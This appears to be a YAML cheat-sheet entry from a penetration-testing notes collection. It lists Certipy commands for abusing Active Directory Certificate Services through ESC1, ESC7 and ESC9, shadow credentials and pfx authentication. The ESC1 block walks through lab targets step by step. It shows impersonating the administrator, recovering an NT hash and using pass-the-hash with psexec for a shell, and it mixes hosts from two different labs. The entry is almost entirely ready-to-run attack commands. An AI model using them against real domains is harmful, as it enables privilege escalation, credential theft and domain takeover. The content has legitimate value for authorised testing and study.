---
variants:
  - label: find
    command: |
      certipy find -dc-ip $DCIP -u $USER@$DOMAIN -p $PASSWORD -vulnerable -stdout
      certipy find -k -target $DC -vulnerable -stdout
  - label: esc1
    command: |
      # 1. find vulnerable templates
      certipy find -dc-ip $DCIP -u $USER -p $PASSWORD -vulnerable -stdout
      # -> found ESC1 on the RetroClients template; note the template name
      # 2. request a cert impersonating administrator
      certipy req -dc-ip $DCIP -u $USER@$DOMAIN -p $PASSWORD -target 'dc.sequel.htb' -ca 'sequel-DC-CA' -template [UserAuthentication] -upn 'administrator@sequel.htb' -key-size 4096
      # -> got a cert but auth failed (likely wrong SID)
      # 3. find the real Administrator SID
      impacket-lookupsid retro.vl/BANKING$:test123@dc.retro.vl
      # -> S-1-5-21-2983547755-698260136-4283918172-500
      # 4. re-request with the correct -sid
      certipy req -u 'BANKING$@retro.vl' -p test123 -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl -sid S-1-5-21-2983547755-698260136-4283918172-500 -key-size 4096
      # 5. auth with the pfx (on errors try ntpdate -s, or add -ldap-shell to add the user to domain admins)
      certipy auth -pfx administrator.pfx -dc-ip 10.129.234.44
      # -> NT hash: 252fac7066d93dd009d4fd2cd0368389
      # 6. pass-the-hash for a shell
      impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389 administrator@DC.retro.vl
  - label: esc7
    command: |
      # add yourself as a CA officer to issue certs manually
      certipy ca -dc-ip $DCIP -u $USER -p $PASSWORD -ca $CA -add-officer $USER
      # enable the SubCA template
      certipy ca -dc-ip $DCIP -u $USER -p $PASSWORD -ca $CA -enable-template subca
      # check the enabled templates
      certipy ca -dc-ip $DCIP -u $USER -p $PASSWORD -ca $CA -list-templates
      # request fails but returns a key; note the Request ID (press y to save .pfx)
      certipy req -u $USER -p $PASSWORD -ca $CA -target $DCIP -template SubCA -upn administrator@$DOMAIN
      # issue the pending request as an officer
      certipy ca -u $USER -p $PASSWORD -ca $CA -target $DCIP -issue-request $REQUESTID
      # retrieve the issued cert
      certipy req -u $USER -p $PASSWORD -ca $CA -target $DCIP -retrieve $REQUESTID
      # auth with the pfx
      certipy auth -pfx administrator.pfx -dc-ip $DCIP -domain $DOMAIN
  - label: esc9
    command: |
      # change the target account's UPN to Administrator
      certipy account update -dc-ip $DCIP -u $USER -hashes $HASH -user $TARGET_USER -upn Administrator
      # request a cert as the target (UPN now = Administrator)
      certipy req -dc-ip $DCIP -u $TARGET_USER@$DOMAIN -hashes $TARGET_HASH -target $DC -ca $CA -template $TEMPLATE -upn administrator@$DOMAIN
      # set the UPN back so it doesn't conflict with the real Administrator
      certipy account update -dc-ip $DCIP -u $USER -hashes $HASH -user $TARGET_USER -upn $TARGET_USER@$DOMAIN
      # auth using the pfx
      certipy auth -dc-ip $DCIP -pfx administrator.pfx -domain $DOMAIN
  - label: shadow
    command: |
      # shadow credentials: add a KeyCredentialLink on the target and recover its hash
      certipy shadow auto -dc-ip $DCIP -u $USER -hashes $HASH -account $TARGET_USER
  - label: auth
    command: |
      # authenticate with a pfx to recover the NT hash / get a TGT
      certipy auth -dc-ip $DCIP -pfx administrator.pfx
      # if that fails, drop into an LDAP shell instead
      certipy auth -dc-ip $DCIP -pfx administrator.pfx -ldap-shell
description: Enumerate and abuse AD CS with Certipy (ESC1 / ESC7 / ESC9 / shadow).
os: [Linux]
category: [oscp, cli]
have: [hash, ticket, cert]
service: [ADCS, Kerberos]
phase: [Enumeration, PrivEsc]
references:
  - https://github.com/ly4k/Certipy
---
